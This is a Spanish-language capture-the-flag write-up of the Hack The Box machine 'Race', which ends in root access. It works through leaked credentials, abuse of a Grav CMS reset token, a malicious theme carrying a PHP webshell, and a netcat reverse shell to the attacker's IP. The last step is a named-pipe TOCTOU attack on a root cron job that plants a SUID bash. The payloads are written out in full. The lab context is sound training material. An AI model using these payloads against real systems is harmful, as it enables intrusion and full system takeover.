# HTB - Race Writeup

**Autor:** TRNNSK
**Dificultad:** Hard
**Sistema:** Linux

---

# Resumen

La máquina **Race** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a explotar credenciales hardcodeadas en un endpoint de phpsysinfo, abusar de la funcionalidad de backup de Grav CMS para obtener un token de reset y escalar privilegios en el panel, luego instalar un tema malicioso via proxy para obtener RCE, y finalmente explotar una vulnerabilidad TOCTOU en un cronjob para escalar a root.

---

# Enumeración

## Escaneo inicial

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.129.234.209
```

### Resultados:

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.52
```

---

# Análisis Web

Al acceder al puerto 80 se redirige a `/racers/`. Con feroxbuster encontramos dos endpoints clave:

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.129.234.209/
```

```
401 GET  http://10.129.234.209/phpsysinfo
200 GET  http://10.129.234.209/racers/admin
```

---

# Vulnerabilidad: Credenciales hardcodeadas en phpsysinfo

## Identificación

El endpoint `/phpsysinfo` usa Basic Authentication. Con credenciales por defecto `admin:admin` obtenemos acceso. En la sección **Process Status** encontramos un comando curl con credenciales hardcodeadas:

```
backup:Wedobackupswithsecur3password5.Noonecanhackus!
```

---

# Explotación (Foothold)

## Paso 1 — Login en Grav CMS con credenciales de phpsysinfo

Con las credenciales encontradas accedemos al panel `/racers/admin`. El usuario tiene permisos limitados pero puede hacer backups.

## Paso 2 — Obtener token de reset de patrick via backup

Solicitamos reset de contraseña para `patrick` (NO EL CORREO DE PATRICK, PATRICK COMO NOMBRE DE USUARIO) en `/racers/admin/forgot`, luego descargamos un backup fresco inmediatamente. Descomprimimos el ZIP y leemos el token:

```bash
cat user/accounts/patrick.yaml | grep reset
# reset: '2b9ff892cd631b97577b7187e1d33c26::1758120218' o lo que sea que tengas...
```

Accedemos al link de reset:
```
http://10.129.234.209/racers/admin/reset/u/patrick/2b9ff892cd631b97577b7187e1d33c26
```

Con la nueva contraseña entramos como `patrick` con más privilegios — acceso a instalar temas y plugins.

## Paso 3 — Instalar tema malicioso via proxy

Como la máquina no tiene internet, configuramos Grav para usar BurpSuite como proxy:
- Configuration → System → HTTP Section → Proxy URL: `http://TUIP:8080`

Preparamos el tema malicioso:
```bash
git clone https://github.com/getgrav/grav-theme-photographer.git ->se recomienda este, pero puede ser cualquiera realmente..
printf '<IfModule mod_rewrite.c>\nRewriteEngine Off\n</IfModule>' > grav-theme-photographer/img/.htaccess
echo '<?php echo system($_GET[0]); ?>' > grav-theme-photographer/img/cmd.php
zip -r pwn.zip grav-theme-photographer

# Servidor HTTP
python3 -m http.server 8000
```

En Grav → Themes → Install → interceptamos la **respuesta** en Burp y cambiamos el header `Location` para que apunte a nuestro ZIP:
```
Location: http://TU_IP:8000/pwn.zip
```

Verificamos RCE:
```bash
curl http://10.129.234.209/racers/user/themes/aerial/img/cmd.php?0=whoami
# www-data
```

## Paso 4 — Reverse shell

```bash
# Listener
nc -lvnp 6767

# Payload
curl -G "http://10.129.234.209/racers/user/themes/aerial/img/cmd.php" \
  --data-urlencode "0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc TU_IP 6767 >/tmp/f"
```

Obtenemos shell como `www-data`.

---

# Lateral Movement — max

En el directorio home de max encontramos un symlink a `/usr/local/share/race-scripts/` con el archivo `offsite-backup.sh` que tiene credenciales hardcodeadas:

```bash
cat /usr/local/share/race-scripts/offsite-backup.sh
# OFFSITE_USER="max"
# OFFSITE_PASS="ruxai0GaemaS1Rah"
```

```bash
ssh max@10.129.234.209
# contraseña: ruxai0GaemaS1Rah
```

Flag de usuario:
```bash
cat /home/max/user.txt
```

---

# Escalada de Privilegios — TOCTOU Race Condition

## Identificación

Con pspy identificamos que root ejecuta `/usr/local/bin/secure-cron-runner.sh` cada minuto. Este script verifica el MD5 de `offsite-backup.sh` antes de ejecutarlo:

```bash
sigs[0]="d15804b944b40ca8540d37ed6bd80906"
scripts[0]="/usr/local/share/race-scripts/offsite-backup.sh"

sig=$(md5sum ${scripts[0]} | awk '{print $1}')
if [[ "x$sig" == "x${sigs[0]}" ]] ; then
    ${scripts[0]}
fi
```

La carpeta `/usr/local/share/race-scripts/` es escribible por el grupo `racers` al que pertenece `max`.

## Vulnerabilidad — TOCTOU (Time Of Check / Time Of Use)

Hay una ventana de tiempo entre que root **verifica** el hash (check) y **ejecuta** el archivo (use). Durante esa ventana podemos sustituir el archivo por uno malicioso.

La técnica usa un **named pipe** — cuando md5sum intenta leer el pipe se **bloquea** esperando datos, dándonos tiempo para sustituir el archivo original por uno malicioso.

## Explotación

```bash
# Crea el payload malicioso
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/hello
chmod 6777 /tmp/hello
EOF
chmod +x /tmp/shell.sh
```

**Set 1 — ejecutar ~30 segundos antes del minuto:**
```bash
cd /usr/local/share/race-scripts
mv offsite-backup.sh offsite-backup.sh.bak ; mknod offsite-backup.sh p
```

Cuando en pspy aparece `CMD: UID=??? | ???` — md5sum está bloqueado leyendo el pipe.

**Set 2 — ejecutar inmediatamente al ver `???` en pspy:**
```bash
mv offsite-backup.sh s ; cp /tmp/shell.sh offsite-backup.sh ; chmod +x offsite-backup.sh ; cat offsite-backup.sh.bak >> s
```

El flujo es:
1. md5sum lee el pipe → se bloquea
2. Movemos el pipe a `s`, ponemos nuestro script malicioso como `offsite-backup.sh`
3. Alimentamos el pipe con el contenido original via `cat >> s`
4. md5sum recibe el contenido original → hash coincide 
5. root ejecuta nuestro `offsite-backup.sh` malicioso
6. `/tmp/hello` se crea con SUID root

```bash
# Verifica y obtén root
ls -la /tmp/hello
# -rwsrwsrwx 1 root root

/tmp/hello -p
id
# euid=0(root)
```

---

# Obtener la Flag

```bash
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Encontrar `/phpsysinfo` con credenciales por defecto `admin:admin`
3. Extraer credenciales hardcodeadas de la sección Process Status
4. Entrar a Grav CMS `/racers/admin` con las credenciales
5. Solicitar reset de contraseña de patrick y capturarlo via backup
6. Login como patrick con más privilegios
7. Configurar BurpSuite como proxy en Grav
8. Interceptar respuesta de instalación de tema y redirigir a tema malicioso
9. Obtener RCE via webshell PHP y lanzar reverse shell
10. Leer credenciales hardcodeadas de max en `offsite-backup.sh`
11. SSH como max y recoger user.txt
12. Usar pspy para identificar el cronjob de root
13. Explotar TOCTOU con named pipe para sustituir el script antes de que root lo ejecute
14. Ejecutar `/tmp/hello -p` para obtener shell root

---

# Conclusión

Esta máquina demuestra cómo:

- Las credenciales hardcodeadas en herramientas de monitoreo como phpsysinfo exponen el sistema completo
- La funcionalidad de backup de un CMS puede ser abusada para obtener tokens de reset y escalar privilegios
- Los proxies permiten interceptar y modificar respuestas HTTP para instalar contenido malicioso
- Las vulnerabilidades TOCTOU en scripts ejecutados por root con verificación de integridad pueden ser bypasseadas usando named pipes para congelar la ejecución y sustituir archivos en la ventana entre verificación y ejecución

---

y ya
